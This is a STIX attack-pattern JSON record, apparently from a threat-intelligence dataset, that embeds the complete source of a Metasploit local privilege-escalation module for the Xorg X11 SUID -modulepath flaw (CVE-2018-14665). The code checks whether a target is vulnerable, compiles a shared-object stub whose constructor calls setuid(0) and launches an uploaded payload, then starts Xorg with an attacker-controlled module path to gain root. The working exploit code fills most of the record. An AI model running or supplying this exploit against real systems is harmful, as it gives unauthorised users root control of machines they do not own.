{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9b2d14e4-18ee-4021-96bf-b2a745d3149f",
    "created": "2024-08-14T17:07:09.407856Z",
    "modified": "2024-08-14T17:07:09.40786Z",
    "name": "Xorg X11 Server SUID modulepath Privilege Escalation",
    "description": " This module attempts to gain root privileges with SUID Xorg X11 server versions 1.19.0 < 1.20.3.  A permission check flaw exists for -modulepath and -logfile options when starting Xorg.  This allows unprivileged users that can start the server the ability to elevate privileges and run arbitrary code under root privileges.  This module has been tested with CentOS 7 (1708). CentOS default install will require console auth for the users session. Xorg must have SUID permissions and may not start if running.  On successful exploitation artifacts will be created consistant with starting Xorg.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/local/xorg_x11_suid_server_modulepath.rb",
            "external_id": "xorg_x11_suid_server_modulepath.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-14665"
        },
        {
            "source_name": "reference",
            "url": "https://www.securepatterns.com/2018/10/cve-2018-14665-another-way-of.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::Kernel\n  include Msf::Post::Linux::System\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Xorg X11 Server SUID modulepath Privilege Escalation',\n        'Description' => %q{\n          This module attempts to gain root privileges with SUID Xorg X11 server\n          versions 1.19.0 < 1.20.3.\n\n          A permission check flaw exists for -modulepath and -logfile options when\n          starting Xorg.  This allows unprivileged users that can start the server\n          the ability to elevate privileges and run arbitrary code under root\n          privileges.\n\n          This module has been tested with CentOS 7 (1708).\n          CentOS default install will require console auth for the users session.\n          Xorg must have SUID permissions and may not start if running.\n\n          On successful exploitation artifacts will be created consistant\n          with starting Xorg.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Narendra Shinde', # Discovery and exploit\n          'Aaron Ringo', # Metasploit module\n        ],\n        'DisclosureDate' => '2018-10-25',\n        'References' => [\n          [ 'CVE', '2018-14665' ],\n          [ 'BID', '105741' ],\n          [ 'EDB', '45697' ],\n          [ 'EDB', '45742' ],\n          [ 'EDB', '45832' ],\n          [ 'URL', 'https://www.securepatterns.com/2018/10/cve-2018-14665-another-way-of.html' ]\n        ],\n        'Platform' => %w[linux unix solaris],\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'SessionTypes' => %w[shell meterpreter],\n        'Targets' => [\n          [\n            'Linux x64', {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X64\n            }\n          ],\n          [\n            'Linux x86', {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X86\n            }\n          ],\n          [\n            'Solaris x86', {\n              'Platform' => [ 'solaris', 'unix' ],\n              'Arch' => ARCH_SPARC\n            }\n          ],\n          [\n            'Solaris x64', {\n              'Platform' => [ 'solaris', 'unix' ],\n              'Arch' => ARCH_SPARC\n            }\n          ],\n        ],\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SERVICE_DOWN ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK ]\n        },\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),\n        OptString.new('Xdisplay', [ true, 'Display exploit will attempt to use', ':1' ]),\n        OptBool.new('ConsoleLock', [ true, 'Will check for console lock under linux', true ]),\n        OptString.new('sofile', [ true, 'Xorg shared object name for modulepath', 'libglx.so' ])\n      ]\n    )\n  end\n\n  def check\n    # linux checks\n    uname = cmd_exec('uname')\n    if uname =~ /linux/i\n      vprint_status 'Running additional check for Linux'\n      if datastore['ConsoleLock']\n        user = cmd_exec('id -un')\n        unless exist?(\"/var/run/console/#{user}\")\n          vprint_error(\"No console lock for #{user}\")\n          return CheckCode::Safe\n        end\n        vprint_good(\"Console lock for #{user}\")\n      end\n    end\n\n    # suid program check\n    xorg_path = cmd_exec('command -v Xorg')\n    unless xorg_path.include?('Xorg')\n      return CheckCode::Safe('Could not find Xorg executable')\n    end\n\n    vprint_good(\"Xorg path found at #{xorg_path}\")\n\n    unless setuid? xorg_path\n      return CheckCode::Safe(\"Xorg binary #{xorg_path} is not SUID\")\n    end\n\n    vprint_good(\"Xorg binary #{xorg_path} is SUID\")\n\n    x_version = cmd_exec 'Xorg -version'\n    if x_version.include?('Release Date')\n      v = Rex::Version.new(x_version.scan(/\\d\\.\\d+\\.\\d+/).first)\n      unless v.between?(Rex::Version.new('1.19.0'), Rex::Version.new('1.20.2'))\n        return CheckCode::Safe(\"Xorg version #{v} not supported\")\n      end\n    elsif x_version.include?('Fatal server error')\n      vprint_error 'User probably does not have console auth'\n      vprint_error 'Below is Xorg -version output'\n      vprint_error x_version\n      return CheckCode::Safe\n    else\n      vprint_warning('Could not parse Xorg -version output')\n      return CheckCode::Appears\n    end\n    vprint_good(\"Xorg version #{v} is vulnerable\")\n\n    # process check for /X\n    proc_list = cmd_exec 'ps ax'\n    if proc_list.include?('/X ')\n      vprint_warning('Xorg in process list')\n      return CheckCode::Appears\n    end\n    vprint_good('Xorg does not appear to be running')\n    return CheckCode::Vulnerable\n  end\n\n  def check_arch_and_compile(path, data)\n    if target['Arch'] == ARCH_X86\n      cpu = Metasm::Ia32.new\n      compile_with_metasm(cpu, path, data)\n    elsif target['Arch'] == ARCH_SPARC\n      compile_with_gcc(path, data)\n    else\n      cpu = Metasm::X86_64.new\n      compile_with_metasm(cpu, path, data)\n    end\n  end\n\n  def compile_with_metasm(cpu, path, data)\n    shared_obj = Metasm::ELF.compile_c(cpu, data).encode_string(:lib)\n    write_file(path, shared_obj)\n    register_file_for_cleanup path\n\n    chmod(path)\n  rescue StandardError\n    print_status('Failed to compile with Metasm. Falling back to compiling with GCC.')\n    compile_with_gcc(path, data)\n  end\n\n  def compile_with_gcc(path, data)\n    unless has_gcc?\n      fail_with Failure::BadConfig, 'gcc is not installed'\n    end\n    vprint_good 'gcc is installed'\n\n    src_path = \"#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha(6..10)}.c\"\n    write_file(src_path, data)\n\n    gcc_cmd = \"gcc -fPIC -shared -o #{path} #{src_path} -nostartfiles\"\n    if session.type.eql? 'shell'\n      gcc_cmd = \"PATH=$PATH:/usr/bin/ #{gcc_cmd}\"\n    end\n    output = cmd_exec gcc_cmd\n    register_file_for_cleanup src_path\n    register_file_for_cleanup path\n\n    unless output.blank?\n      print_error output\n      fail_with Failure::Unknown, \"#{src_path} failed to compile\"\n    end\n\n    chmod path\n  end\n\n  def exploit\n    check_status = check\n    if check_status == CheckCode::Appears\n      print_warning 'Could not get version or Xorg process possibly running, may fail'\n    elsif check_status == CheckCode::Safe\n      fail_with Failure::NotVulnerable, 'Target not vulnerable'\n    end\n\n    if is_root?\n      fail_with Failure::BadConfig, 'This session already has root privileges'\n    end\n\n    unless writable? datastore['WritableDir']\n      fail_with Failure::BadConfig, \"#{datastore['WritableDir']} is not writable\"\n    end\n\n    print_good 'Passed all initial checks for exploit'\n\n    modulepath = datastore['WritableDir']\n    sofile = \"#{modulepath}/#{datastore['sofile']}\"\n    pscript = \"#{modulepath}/.session-#{rand_text_alphanumeric 5..10}\"\n    xdisplay = datastore['Xdisplay']\n\n    stub = %^\nextern int setuid(int);\nextern int setgid(int);\nextern int system(const char *__s);\n\nvoid _init(void) __attribute__((constructor));\n\nvoid __attribute__((constructor))  _init() {\nsetgid(0);\nsetuid(0);\nsystem(\"#{pscript} &\");\n  }\n    ^\n    print_status 'Writing launcher and compiling'\n    check_arch_and_compile(sofile, stub)\n\n    # Uploading\n    print_status 'Uploading your payload, this could take a while'\n    if payload.arch.first == 'cmd'\n      write_file(pscript, payload.encoded)\n    else\n      write_file(pscript, generate_payload_exe)\n    end\n    chmod pscript\n    register_file_for_cleanup pscript\n\n    # Actual exploit with cron overwrite\n    print_status 'Exploiting'\n    # Xorg -logfile derp -modulepath ',/tmp' :1\n    xorg_cmd = \"Xorg -modulepath ',#{modulepath}' #{xdisplay} & >/dev/null\"\n    cmd_exec xorg_cmd\n    Rex.sleep 7\n    cmd_exec 'pkill Xorg'\n    Rex.sleep 1\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-10-25",
    "x_mitre_platforms": [
        "[ 'solaris', 'unix' ]"
    ]
}